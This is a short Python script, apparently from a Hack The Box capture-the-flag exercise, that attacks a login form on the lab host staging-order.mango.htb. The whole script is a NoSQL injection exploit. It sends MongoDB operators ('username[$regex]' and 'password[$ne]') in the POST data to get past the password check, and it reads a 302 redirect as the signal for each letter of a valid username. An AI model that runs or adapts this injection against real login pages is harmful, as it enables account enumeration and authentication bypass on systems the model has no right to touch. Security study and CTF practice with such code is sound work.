from requests import post
from string import lowercase

url = 'http://staging-order.mango.htb/'

def sendPayload():
    for char in lowercase:
        regex = '{}.*'.format(char) 
        data = { 'username[$regex]' : regex, 'password[$ne]' : 'password', 'login' : 'login' }
        response = post(url, data =data , allow_redirects=False)
        if response.status_code == 302:
            print "Found valid letter: {}".format(char)

def getUser():
    sendPayload()

if __name__ == '__main__':
    getUser()
